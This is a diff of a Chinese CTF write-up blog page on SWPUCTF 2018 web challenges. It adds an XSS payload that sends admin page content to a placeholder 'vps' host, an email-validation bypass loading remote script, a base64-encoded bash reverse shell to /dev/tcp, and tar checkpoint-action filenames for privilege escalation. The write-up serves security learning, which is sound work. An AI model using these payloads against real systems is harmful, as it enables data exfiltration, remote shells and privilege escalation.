@@ -35,7 +35,7 @@
 <meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsyWGj.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsREAf.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/12/21/Fs4AMQ.png">
-<meta property="og:updated_time" content="2018-12-22T08:07:47.979Z">
+<meta property="og:updated_time" content="2018-12-22T12:40:07.803Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="swpuctf赛后复现">
 <meta name="twitter:description" content="前言这个比赛Web真的很有质量，学到了很多东西">
@@ -417,21 +417,24 @@
 <p>可以从check.php里面的源码发现验证邮箱我们可以去绕过</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line">if($_POST[&apos;email&apos;]) &#123;</span><br><span class="line">$email = $_POST[&apos;email&apos;];</span><br><span class="line">if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">echo &quot;error email, please check your email&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;等待管理员自动审核&quot;;</span><br><span class="line">echo $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
 <p>构造源代码的脚本：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:49102/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"admin.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"admin.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
 <p>构造的绕过payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script/src=//vps_ip/payload.js&gt;&lt;/script&gt;&quot;@example.com</span><br></pre></td></tr></table></figure>
 <p>监听端口，发现</p>
 <p><img src="https://s1.ax1x.com/2018/12/21/Fs4AMQ.png" alt="Fs4AMQ.png"></p>
 <p>解码得到</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"admin/a0a.php?cmd=whoami"</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>说明可以执行命令，然后重新修改脚本</p>
+<p>说明可以执行命令，然后重新修改脚本，反弹webshell，就在这一步的是时候，他喵的，他喵的，题目挂了我还是学习一下巨佬们的骚思路吧，这里学习了执念于心大佬的思路，通过写sh文件去反弹shell，用的是base64写shell,利用了管道符然后重定向到一个文件里面，echo后面的内容就是你写的反弹shell语句<code>/bin/bash -i &gt; /dev/tcp/ip/port 0&lt;&amp;1 2&gt;&amp;1</code>经过base64之后的语句</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 'L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvaXAvcG9ydCAwPCYxIDI+JjE=' | base64 -d &gt; /tmp/xjb.sh</span><br></pre></td></tr></table></figure>
+<p>然后执行<code>/bin/bash /tmp/**.sh</code>即可，这题的骚操作在于利用tar去提权，可以参考这篇文章，执行以下几句话,应该是先上传这几个名字的文件，利用了tar顺便把文件名给执行了，然后实现你的目的，你的目的内容写在demo.sh里面即可，你可以以对方身份webshell也行，直接读取flag也行，学到了，2333，以前对LInux的提权还是不太熟悉的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--checkpoint-action=exec=sh demo.sh</span><br><span class="line">--checkpoint=1</span><br><span class="line">demo.sh</span><br></pre></td></tr></table></figure>
 <h2 id="小结一下漏洞点"><a href="#小结一下漏洞点" class="headerlink" title="小结一下漏洞点"></a>小结一下漏洞点</h2><ol>
 <li>php位随机数爆破，得注意一下对应的版本是否正确才是用脚本去爆破，在有的时候还可以把随机数的格式换一下便于爆破</li>
 <li>命令执行的绕过点，第一个是关于正则的m修饰符的小trick，用<code>%0a</code>去绕过，第二个就是就是对于整个单词如何进行切割绕过，可以用<code>\</code>以及单引号去绕过</li>
 <li>NoSQL注入的过程，以及那个骚气的识别验证码的脚本，都是我薄弱的点，以后找个时间单独锻炼一下</li>
 <li>python站的遇到secret_key就应该想到其中的一个思路就应该是构造session，还有python站的继承链的构造也是一个点，不太熟悉，也需要锻炼</li>
 <li>看到file_exists这类的函数的时候应该有很好的意识去想到需要去用<code>phar</code>协议去测试一下，同样的里面的pop链构造也是自己薄弱的点，还得多加练习</li>
-<li>这个邮箱注册绕过 FILTER_VALIDATE_EMAIL然后xss，攻击只有本地才能访问的local web应用，从而反弹shell，然后继续攻击内网web题目，使用tar提权查看flag，这思路很好学到了。。。只能说出题人真的tql…</li>
+<li>这个邮箱注册绕过 FILTER_VALIDATE_EMAIL然后xss，攻击只有本地才能访问的local web应用，从而反弹shell，然后继续攻击内网web题目，使用tar提权查看flag，这思路很好，学到了。。。回去得看看Linux的提权骚操作了，只能说出题人真的tql…</li>
 </ol>
 
       
@@ -444,7 +447,7 @@
         <p><span>本文标题:</span><a href="/swpuctf-2018.html">swpuctf赛后复现</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
         <p><span>发布时间:</span>2018-12-22, 16:02:40</p>
-        <p><span>最后更新:</span>2018-12-22, 16:07:47</p>
+        <p><span>最后更新:</span>2018-12-22, 20:40:07</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/swpuctf-2018.html" title="swpuctf赛后复现">0verwatch.top/swpuctf-2018.html</a>
             <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/swpuctf-2018.html　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
